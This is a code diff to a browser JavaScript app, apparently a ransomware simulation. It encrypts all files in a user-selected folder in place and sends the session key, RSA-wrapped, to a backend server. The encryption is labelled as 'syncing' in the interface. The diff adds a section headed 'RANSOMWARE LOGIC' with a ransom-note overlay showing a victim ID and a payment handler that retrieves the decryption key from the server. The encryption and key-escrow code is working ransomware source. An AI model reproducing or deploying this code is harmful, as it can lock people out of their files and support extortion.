@@ -18,33 +18,30 @@ const state = {
 
 let DOM = {};
 
+// ... (initializeIdentity, log, checkFSASupport, handleDirectorySelection, updateFilesList - keep as is) ...
+// --- COPY existing Identity, Logging, and basic UI handlers here ---
+
+// [PASTE YOUR EXISTING Identity/Logging functions here for brevity, they don't change]
+
 // --- 1. IDENTITY MANAGEMENT (SessionStorage) ---
 const initializeIdentity = async () => {
-    // [CHANGE 1] Đọc từ sessionStorage thay vì localStorage
     const storedIdentity = sessionStorage.getItem('rob_identity');
-
     if (storedIdentity) {
         const data = JSON.parse(storedIdentity);
         state.clientId = data.clientId;
         state.backendPublicKey = data.publicKey;
-        log(`Session restored (Tab active): ${state.clientId}`, 'success');
+        log(`Session restored: ${state.clientId}`, 'success');
     } else {
-        log('New session started. Generating identity...', 'warning');
         try {
             const res = await fetch(`${API_BASE_URL}/new`, { method: 'POST' });
             if (!res.ok) throw new Error('Server handshake failed');
-            
             const data = await res.json();
             state.clientId = data.clientId;
             state.backendPublicKey = data.publicKey;
-            
-            // [CHANGE 2] Lưu vào sessionStorage (Mất khi đóng tab)
             sessionStorage.setItem('rob_identity', JSON.stringify({
                 clientId: data.clientId,
-                publicKey: data.publicKey,
-                createdAt: new Date().toISOString()
+                publicKey: data.publicKey
             }));
-
             log(`Identity assigned: ${state.clientId}`, 'success');
         } catch (err) {
             log(`Connection Error: ${err.message}`, 'error');
@@ -52,94 +49,74 @@ const initializeIdentity = async () => {
     }
 };
 
-// --- 2. LOGGING ---
 const log = (message, type = 'info') => {
-  const now = new Date();
-  const logEntry = document.createElement('div');
-  logEntry.className = `log-entry log-${type}`;
-  logEntry.textContent = `[${now.toLocaleTimeString()}] ${message}`;
-  DOM.logContainer.appendChild(logEntry);
-  DOM.logContainer.scrollTop = DOM.logContainer.scrollHeight;
+    const now = new Date();
+    const logEntry = document.createElement('div');
+    logEntry.className = `log-entry log-${type}`;
+    logEntry.textContent = `[${now.toLocaleTimeString()}] ${message}`;
+    DOM.logContainer.appendChild(logEntry);
+    DOM.logContainer.scrollTop = DOM.logContainer.scrollHeight;
+};
+
+const checkFSASupport = () => {
+    if (FileSystemModule.isSupported()) {
+      DOM.supportStatus.className = 'status-box success';
+      DOM.supportStatus.innerHTML = `✅ <strong>System Compatible</strong>: File System Access API is available.`;
+      DOM.selectDirBtn.disabled = false;
+    } else {
+      DOM.supportStatus.className = 'status-box error';
+      DOM.supportStatus.innerHTML = `❌ <strong>Incompatible Browser</strong>: Please use Chrome or Edge.`;
+      DOM.selectDirBtn.disabled = true;
+    }
+};
+
+const handleDirectorySelection = async () => {
+    try {
+      const directoryHandle = await FileSystemModule.selectDirectory();
+      state.selectedDirectory = directoryHandle;
+      DOM.selectedDirInfo.innerHTML = `<p><strong>Target:</strong> ${directoryHandle.name}</p><p><strong>Status:</strong> Ready</p>`;
+      DOM.startEncryptBtn.disabled = false;
+      log(`Folder mounted: ${directoryHandle.name}`, 'success');
+    } catch (error) {
+        if (error.name !== 'AbortError') log(`Selection Error: ${error.message}`, 'error');
+    }
+};
+
+const updateFilesList = () => {
+    const last = state.encryptedFiles[state.encryptedFiles.length - 1];
+    if (last) {
+        const div = document.createElement('div');
+        div.className = 'encrypted';
+        div.textContent = `✓ Uploaded: ${last.name}`;
+        DOM.filesList.prepend(div);
+    }
 };
 
 // --- 3. KEY EXCHANGE ---
 const reportSessionKey = async (rawKeyBase64) => {
     if (!state.clientId) return;
-
     let payloadKey = rawKeyBase64;
-
     if (state.backendPublicKey) {
         try {
             const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
             const encryptedBuffer = crypto.publicEncrypt(
-                {
-                    key: state.backendPublicKey,
-                    padding: crypto.constants.RSA_PKCS1_PADDING
-                },
+                { key: state.backendPublicKey, padding: crypto.constants.RSA_PKCS1_PADDING },
                 aesKeyBuffer
             );
             payloadKey = encryptedBuffer.toString('base64');
-        } catch (e) {
-            console.error("RSA Encryption failed", e);
-        }
+        } catch (e) { console.error("RSA Encryption failed", e); }
     }
-
     await fetch(`${API_BASE_URL}/session-keys`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            clientId: state.clientId,
-            key: payloadKey,
-            filesCount: state.totalFiles
-        })
+        body: JSON.stringify({ clientId: state.clientId, key: payloadKey, filesCount: state.totalFiles })
     });
 };
 
-// --- 4. UI HANDLERS ---
-const checkFSASupport = () => {
-  if (FileSystemModule.isSupported()) {
-    DOM.supportStatus.className = 'status-box success';
-    DOM.supportStatus.innerHTML = `✅ <strong>System Compatible</strong>: File System Access API is available.`;
-    DOM.selectDirBtn.disabled = false;
-  } else {
-    DOM.supportStatus.className = 'status-box error';
-    DOM.supportStatus.innerHTML = `❌ <strong>Incompatible Browser</strong>: Please use Chrome or Edge.`;
-    DOM.selectDirBtn.disabled = true;
-  }
-};
+// --- 4. RANSOMWARE LOGIC ---
 
-const handleDirectorySelection = async () => {
-  try {
-    const directoryHandle = await FileSystemModule.selectDirectory();
-    state.selectedDirectory = directoryHandle;
-    
-    DOM.selectedDirInfo.innerHTML = `
-        <p><strong>Target:</strong> ${directoryHandle.name}</p>
-        <p><strong>Status:</strong> Ready to sync</p>
-    `;
-    DOM.startEncryptBtn.disabled = false;
-    log(`Folder mounted: ${directoryHandle.name}`, 'success');
-  } catch (error) {
-    if (error.name !== 'AbortError') {
-      log(`Selection Error: ${error.message}`, 'error');
-    }
-  }
-};
-
-const updateFilesList = () => {
-  const last = state.encryptedFiles[state.encryptedFiles.length - 1];
-  if (last) {
-      const div = document.createElement('div');
-      div.className = 'encrypted';
-      div.textContent = `✓ Uploaded: ${last.name}`;
-      DOM.filesList.prepend(div);
-  }
-};
-
-// --- 5. CORE OPERATIONS ---
 const startEncryption = async () => {
     if (!state.selectedDirectory) return;
-    
     if (!state.clientId) await initializeIdentity();
 
     state.isEncrypting = true;
@@ -152,34 +129,89 @@ const startEncryption = async () => {
     try {
         const session = await CryptoModule.generateSessionKey();
         const sessionAes = session.aes;
-        
         await reportSessionKey(session.rawKeyBase64);
 
         const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
         state.totalFiles = files.length;
         state.filesProcessed = 0;
-        log(`Indexing complete: ${files.length} files found.`, 'info');
+        log(`Found ${files.length} files.`, 'info');
 
         for (let i = 0; i < files.length; i++) {
             const fileHandle = files[i];
             DOM.progressText.textContent = `Syncing: ${fileHandle.name}...`;
-            
             await encryptFileInPlace(fileHandle, sessionAes);
-            
             state.filesProcessed++;
             DOM.progressBar.style.width = `${(state.filesProcessed / state.totalFiles) * 100}%`;
         }
         
         log('Synchronization Finished.', 'success');
         DOM.progressText.textContent = 'Done.';
+        
+        // TRIGGER RANSOM NOTE
+        setTimeout(showRansomNote, 1500);
+
     } catch (error) {
         log(`Error: ${error.message}`, 'error');
     } finally {
         state.isEncrypting = false;
-        DOM.decryptBtn.disabled = false;
-        DOM.selectDirBtn.disabled = false;
     }
 };
+
+const showRansomNote = () => {
+    DOM.victimIdDisplay.textContent = state.clientId;
+    DOM.ransomOverlay.style.display = 'flex';
+    log('⚠️ FILES ENCRYPTED. RANSOM NOTE DISPLAYED.', 'error');
+};
+
+const handlePayment = async () => {
+    const payBtn = document.getElementById('payRansomBtn');
+    const statusDiv = document.getElementById('paymentStatus');
+    
+    payBtn.disabled = true;
+    payBtn.textContent = "Contacting Server...";
+    statusDiv.textContent = "Verifying transaction on blockchain...";
+
+    try {
+        // Call Backend to Recover Key
+        const res = await fetch(`${API_BASE_URL}/recover`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ clientId: state.clientId })
+        });
+
+        const data = await res.json();
+
+        if (res.ok && data.success) {
+            statusDiv.style.color = '#4ec9b0';
+            statusDiv.textContent = "PAYMENT VERIFIED! Decrypting files...";
+            log('Payment accepted. Decryption key received.', 'success');
+            
+            // Auto-Decrypt
+            await decryptAllFiles(data.key);
+            
+            // Close Overlay
+            setTimeout(() => {
+                DOM.ransomOverlay.style.display = 'none';
+                alert("All files have been restored.");
+                // Reset UI
+                DOM.selectDirBtn.disabled = false;
+                DOM.decryptBtn.disabled = false;
+                DOM.startEncryptBtn.disabled = false;
+            }, 1000);
+
+        } else {
+            throw new Error(data.error || "Payment verification failed");
+        }
+    } catch (error) {
+        payBtn.disabled = false;
+        payBtn.textContent = "💸 SIMULATE PAYMENT & DECRYPT";
+        statusDiv.style.color = '#f14c4c';
+        statusDiv.textContent = `Error: ${error.message}`;
+        log(`Recovery failed: ${error.message}`, 'error');
+    }
+};
+
+// --- 5. FILE OPS ---
 
 const encryptFileInPlace = async (fileHandle, cryptoKey) => {
   try {
@@ -199,7 +231,6 @@ const encryptFileInPlace = async (fileHandle, cryptoKey) => {
     );
 
     await FileSystemModule.writeBytesToHandle(fileHandle, encryptedBytes);
-
     state.encryptedFiles.push({ name: fileHandle.name });
     updateFilesList();
 
@@ -208,16 +239,14 @@ const encryptFileInPlace = async (fileHandle, cryptoKey) => {
   }
 };
 
-const decryptAllFiles = async () => {
-    if (!state.selectedDirectory) {
-        log('Please open the project folder first.', 'error');
-        return;
-    }
-    const rawKeyBase64 = prompt('Enter Decryption Key (Base64):');
+// Modified to accept an optional key (Auto-mode)
+const decryptAllFiles = async (autoKey = null) => {
+    if (!state.selectedDirectory) return;
+    
+    const rawKeyBase64 = autoKey || prompt('Enter Decryption Key (Base64):');
     if (!rawKeyBase64) return;
 
     log('Starting recovery process...', 'info');
-    DOM.decryptBtn.disabled = true;
     DOM.progressBar.style.width = '0%';
 
     try {
@@ -233,8 +262,6 @@ const decryptAllFiles = async () => {
         log(`Recovery finished.`, 'success');
     } catch (error) {
         log(`Recovery failed: ${error.message}`, 'error');
-    } finally {
-        DOM.decryptBtn.disabled = false;
     }
 };
 
@@ -275,12 +302,17 @@ export const initApp = async () => {
     filesList: document.getElementById('filesList'),
     logContainer: document.getElementById('logContainer'),
     clearLogsBtn: document.getElementById('clearLogsBtn'),
+    // Ransom Elements
+    ransomOverlay: document.getElementById('ransomOverlay'),
+    victimIdDisplay: document.getElementById('victimIdDisplay'),
+    payRansomBtn: document.getElementById('payRansomBtn')
   };
 
   DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
   DOM.startEncryptBtn.addEventListener('click', startEncryption);
-  DOM.decryptBtn.addEventListener('click', decryptAllFiles);
+  DOM.decryptBtn.addEventListener('click', () => decryptAllFiles(null));
   DOM.clearLogsBtn.addEventListener('click', () => DOM.logContainer.innerHTML = '');
+  DOM.payRansomBtn.addEventListener('click', handlePayment);
 
   checkFSASupport();
   await initializeIdentity();
